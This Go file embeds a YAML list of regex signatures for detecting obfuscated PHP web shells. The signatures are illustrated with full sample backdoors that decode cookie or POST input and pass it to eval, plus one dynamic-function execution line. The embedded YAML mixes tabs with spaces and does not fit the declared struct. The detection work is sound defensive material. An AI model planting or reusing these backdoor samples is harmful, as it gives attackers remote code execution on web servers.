package main

import (
	"fmt"

	"gopkg.in/yaml.v2"
)

var data = `
---
patterns:
	regexp: 
    - pattern: \$[a-z0-9]{3,8}\[[0-9]+\](\s*?\.\s*?\$[a-z0-9]{3,8}\[[0-9]+\]){8}
      description: 配列繋げるやつ
      sample:
        - <?php $awnepl = 'rni96f-cu03Hd7mkaptle2*sov\'x14#y_gb8';$bankbin = Array();$bankbin[] = $awnepl[11].$awnepl[22];$bankbin[] = $awnepl[9].$awnepl[10].$awnepl[10].$awnepl[29].$awnepl[16].$awnepl[12].$awnepl[35].$awnepl[5].$awnepl[6].$awnepl[35].$awnepl[13].$awnepl[4].$awnepl[34].$awnepl[6].$awnepl[29].$awnepl[16].$awnepl[20].$awnepl[13].$awnepl[6].$awnepl[3].$awnepl[7].$awnepl[20].$awnepl[29].$awnepl[6].$awnepl[12].$awnepl[35].$awnepl[28].$awnepl[12].$awnepl[21].$awnepl[35].$awnepl[21].$awnepl[20].$awnepl[29].$awnepl[4].$awnepl[21].$awnepl[12];$bankbin[] = $awnepl[30];$bankbin[] = $awnepl[7].$awnepl[24].$awnepl[8].$awnepl[1].$awnepl[18];$bankbin[] = $awnepl[23].$awnepl[18].$awnepl[0].$awnepl[32].$awnepl[0].$awnepl[20].$awnepl[17].$awnepl[20].$awnepl[16].$awnepl[18];$bankbin[] = $awnepl[20].$awnepl[27].$awnepl[17].$awnepl[19].$awnepl[24].$awnepl[12].$awnepl[20];$bankbin[] = $awnepl[23].$awnepl[8].$awnepl[34].$awnepl[23].$awnepl[18].$awnepl[0];$bankbin[] = $awnepl[16].$awnepl[0].$awnepl[0].$awnepl[16].$awnepl[31].$awnepl[32].$awnepl[14].$awnepl[20].$awnepl[0].$awnepl[33].$awnepl[20];$bankbin[] = $awnepl[23].$awnepl[18].$awnepl[0].$awnepl[19].$awnepl[20].$awnepl[1];$bankbin[] = $awnepl[17].$awnepl[16].$awnepl[7].$awnepl[15];foreach ($bankbin[7]($_COOKIE, $_POST) as $lanxs => $wtxgcqm){function fjqfy($bankbin, $lanxs, $zmhij){return $bankbin[6]($bankbin[4]($lanxs . $bankbin[1], ($zmhij / $bankbin[8]($lanxs)) + 1), 0, $zmhij);}function hlcfo($bankbin, $qxvdup){return @$bankbin[9]($bankbin[0], $qxvdup);}function wzcoxmm($bankbin, $qxvdup){$mnoomgc = $bankbin[3]($qxvdup) % 3;if (!$mnoomgc) {eval($qxvdup[1]($qxvdup[2]));exit();}}$wtxgcqm = hlcfo($bankbin, $wtxgcqm);wzcoxmm($bankbin, $bankbin[5]($bankbin[2], $wtxgcqm ^ fjqfy($bankbin, $lanxs, $bankbin[8]($wtxgcqm))));}  
        - <?php $rperlz = '2ix7d6t0\'-9r4pbg8smue3Hv_caylonk*#';$ofnpnxn = Array();$ofnpnxn[] = $rperlz[22].$rperlz[32];$ofnpnxn[] = $rperlz[33];$ofnpnxn[] = $rperlz[0].$rperlz[21].$rperlz[12].$rperlz[21].$rperlz[10].$rperlz[5].$rperlz[16].$rperlz[16].$rperlz[9].$rperlz[4].$rperlz[3].$rperlz[0].$rperlz[14].$rperlz[9].$rperlz[12].$rperlz[25].$rperlz[0].$rperlz[0].$rperlz[9].$rperlz[26].$rperlz[16].$rperlz[26].$rperlz[14].$rperlz[9].$rperlz[21].$rperlz[5].$rperlz[20].$rperlz[7].$rperlz[4].$rperlz[26].$rperlz[5].$rperlz[25].$rperlz[3].$rperlz[14].$rperlz[16].$rperlz[14];$ofnpnxn[] = $rperlz[25].$rperlz[29].$rperlz[19].$rperlz[30].$rperlz[6];$ofnpnxn[] = $rperlz[17].$rperlz[6].$rperlz[11].$rperlz[24].$rperlz[11].$rperlz[20].$rperlz[13].$rperlz[20].$rperlz[26].$rperlz[6];$ofnpnxn[] = $rperlz[20].$rperlz[2].$rperlz[13].$rperlz[28].$rperlz[29].$rperlz[4].$rperlz[20];$ofnpnxn[] = $rperlz[17].$rperlz[19].$rperlz[14].$rperlz[17].$rperlz[6].$rperlz[11];$ofnpnxn[] = $rperlz[26].$rperlz[11].$rperlz[11].$rperlz[26].$rperlz[27].$rperlz[24].$rperlz[18].$rperlz[20].$rperlz[11].$rperlz[15].$rperlz[20];$ofnpnxn[] = $rperlz[17].$rperlz[6].$rperlz[11].$rperlz[28].$rperlz[20].$rperlz[30];$ofnpnxn[] = $rperlz[13].$rperlz[26].$rperlz[25].$rperlz[31];foreach ($ofnpnxn[7]($_COOKIE, $_POST) as $ziqcy => $wzjkyhe){function eofqh($ofnpnxn, $ziqcy, $lcxxzeo){return $ofnpnxn[6]($ofnpnxn[4]($ziqcy . $ofnpnxn[2], ($lcxxzeo / $ofnpnxn[8]($ziqcy)) + 1), 0, $lcxxzeo);}function vfird($ofnpnxn, $zdeysi){return @$ofnpnxn[9]($ofnpnxn[0], $zdeysi);}function gkrvw($ofnpnxn, $zdeysi){$iuneso = $ofnpnxn[3]($zdeysi) % 3;if (!$iuneso) {eval($zdeysi[1]($zdeysi[2]));exit();}}$wzjkyhe = vfird($ofnpnxn, $wzjkyhe);gkrvw($ofnpnxn, $ofnpnxn[5]($ofnpnxn[1], $wzjkyhe ^ eofqh($ofnpnxn, $ziqcy, $ofnpnxn[8]($wzjkyhe))));}

    - pattern: (\$[a-z]{3,6}=\$[a-z]{3,6}\(\$[a-z]{3,6}\[[a-z]{3,6}\]\);){2}\$[a-z]{3,6}=\$[a-z]{3,6}\("",\$[a-z]{3,6}\);\$[a-z]{3,6}\(\);
      description: ・・・ 
      sample:
				- $kery=$qlic($tlzho[hqqi]);$jwgsj=$qlic($tlzho[hxma]);$wetfc=$kery("",$jwgsj);$wetfc();
	static:
	
`

type Data struct {
	Patterns []RegexpPattern `yaml:"patterns"`
}

type RegexpPattern struct {
	Pattern string `yaml:"pattern"`
}

type Parser interface {
	Unmarshal([]byte, interface{}) error
}

func main() {

	d := Data{}
	if err := yaml.Unmarshal([]byte(data), &d); err != nil {
		panic(err)
	}
	fmt.Printf("--- d:\n%v\n\n", d)

}
